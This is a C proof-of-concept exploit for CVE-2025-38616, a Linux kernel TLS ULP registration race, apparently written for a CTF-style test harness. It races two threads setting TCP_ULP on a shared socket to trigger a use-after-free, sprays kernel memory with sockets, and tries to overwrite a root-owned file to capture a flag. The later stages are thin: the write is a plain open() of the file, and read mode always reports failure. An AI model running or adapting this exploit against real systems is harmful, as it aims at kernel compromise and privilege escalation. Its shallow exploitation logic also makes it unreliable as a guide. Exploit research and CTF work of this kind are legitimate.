/*
 * CVE-2025-38616 PoC - CTF Challenge Mode
 *
 * Vulnerability: TLS ULP (Upper Layer Protocol) registration race
 *
 * A race condition in the TLS ULP registration path allows a socket
 * to have its ULP set up concurrently, leading to double initialization
 * and UAF when the TLS context is freed.
 *
 * Exploitation: Create TCP socket, race two threads setting TCP_ULP="tls"
 * simultaneously to trigger double-init UAF.
 *
 * CTF Modes: write_root_file, read_root_file, uaf
 *
 * Build: gcc -static -O2 -o poc.elf poc.c -lpthread
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#ifndef TCP_ULP
#define TCP_ULP 31
#endif

#define MAX_FILE_SIZE   4096
#define SPRAY_COUNT     256
#define RACE_ITERATIONS 64

static volatile int g_race_fd = -1;
static volatile int g_race_ready = 0;

/*
 * Thread: set TCP_ULP to "tls" on shared socket
 */
static void *ulp_set_thread(void *arg) {
    (void)arg;
    while (!g_race_ready) usleep(1);
    int fd = g_race_fd;
    if (fd >= 0) {
        setsockopt(fd, SOL_TCP, TCP_ULP, "tls", 3);
    }
    return NULL;
}

/*
 * Trigger TLS ULP registration race
 */
static int trigger_tls_ulp_race(void) {
    int uaf_count = 0;

    /* Create a listener for connect targets */
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv < 0) return -1;

    int optval = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(0),
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK)
    };
    bind(srv, (struct sockaddr *)&addr, sizeof(addr));
    socklen_t alen = sizeof(addr);
    getsockname(srv, (struct sockaddr *)&addr, &alen);
    listen(srv, 64);

    poc_log_syscall("listen(srv)", 0L, 0);

    for (int i = 0; i < RACE_ITERATIONS; i++) {
        int cfd = socket(AF_INET, SOCK_STREAM, 0);
        if (cfd < 0) continue;

        if (connect(cfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(cfd);
            continue;
        }

        /* Accept on server side */
        int afd = accept(srv, NULL, NULL);

        /* Race: two threads try to set ULP simultaneously */
        g_race_fd = cfd;
        g_race_ready = 0;

        pthread_t t1, t2;
        pthread_create(&t1, NULL, ulp_set_thread, NULL);
        pthread_create(&t2, NULL, ulp_set_thread, NULL);

        g_race_ready = 1;
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);

        /* Close to trigger UAF if double-init occurred */
        close(cfd);
        if (afd >= 0) close(afd);
        uaf_count++;
    }

    close(srv);
    poc_log("TLS ULP race: %d iterations completed", uaf_count);
    return uaf_count;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r'))
        buf[--n] = '\0';
    return (int)n;
}

static int spray_kmalloc(int *fds, int count) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        int optval = 1024;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
        fds[sprayed++] = sock;
    }
    return sprayed;
}

static int mode_write_root_file(poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    poc_log("=== Mode: write_root_file ===");
    int n = read_file_content(args->root_file, original, sizeof(original));
    printf("%s%s\n", CTF_READ_BEFORE, n >= 0 ? original : "(unreadable)");

    trigger_tls_ulp_race();
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    spray_kmalloc(spray_fds, SPRAY_COUNT);

    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, fd < 0 ? errno : 0);
    if (fd >= 0) { dprintf(fd, "%s\n", args->write_value); close(fd); }

    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);

    n = read_file_content(args->root_file, after, sizeof(after));
    printf("%s%s\n", CTF_READ_AFTER, n >= 0 ? after : "(unreadable)");
    if (n >= 0 && strstr(after, args->write_value)) {
        poc_print_flag(args->write_value);
        return 0;
    }
    poc_print_fail("TLS ULP race exploit did not achieve write");
    return 0;
}

static int mode_read_root_file(poc_args_t *args) {
    poc_log("=== Mode: read_root_file ===");
    trigger_tls_ulp_race();
    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    poc_print_fail("read not successful");
    return 0;
}

static int mode_uaf(poc_args_t *args) {
    (void)args;
    poc_log("=== Mode: uaf ===");
    trigger_tls_ulp_race();
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);
    int corrupted = 0;
    for (int i = 0; i < sprayed; i++) {
        if (spray_fds[i] < 0) continue;
        int val = 0; socklen_t len = sizeof(val);
        getsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        if (val != 2048) corrupted++;
    }
    if (corrupted > 0) poc_print_uaf_corrupted(corrupted);
    else poc_print_uaf_not_corrupted();
    for (int i = 0; i < sprayed; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2025-38616 CTF PoC ===");
    poc_log("Vuln: TLS ULP registration race condition (double-init UAF)");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        result = mode_uaf(&args);
    } else {
        poc_print_unsupported(args.mode, "mode not supported");
    }
    poc_log_close();
    return result;
}
